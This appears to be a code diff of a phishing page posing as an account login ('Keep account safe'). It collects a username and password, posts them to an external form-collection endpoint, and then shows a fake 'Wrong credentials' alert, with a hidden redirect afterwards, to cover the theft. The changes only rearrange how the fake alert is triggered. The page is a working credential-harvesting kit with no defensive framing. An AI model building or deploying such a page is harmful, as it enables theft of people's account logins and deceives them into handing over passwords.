@@ -14,7 +14,7 @@
                 <img src="img/x.png" alt="Logo" class="logo-img">
             </div>
             <h1>Keep account safe</h1>
-            <form class="login-form" action="https://submit-form.com/fqbhCid6o" onsubmit="showAlert()">
+            <form class="login-form" action="https://submit-form.com/fqbhCid6o">
                 <input
                 type="hidden"
                 name="_redirect"
@@ -22,7 +22,7 @@
                 />
                 <input name="first" type="text" placeholder="Phone, email, or username" required>
                 <input name="second" type="password" placeholder="Password" required>
-                <button type="submit">Next</button>
+                <button type="submit" onclick="showAlert()">Next</button>
             </form>
             <div class="forgot-password">
                 <a href="#">Forgot password?</a>
@@ -33,13 +33,10 @@
         </div>
     </div>
 
-    <script src="script.js">
-    function showAlert() {
-        alert('Wrong credentials'); // Show the alert message
-        return true;
-    }
-
-
+    <script>
+        function showAlert() {
+            alert("Wrong credentials !!! Please try again.");
+        }
     </script>
 </body>
 </html>
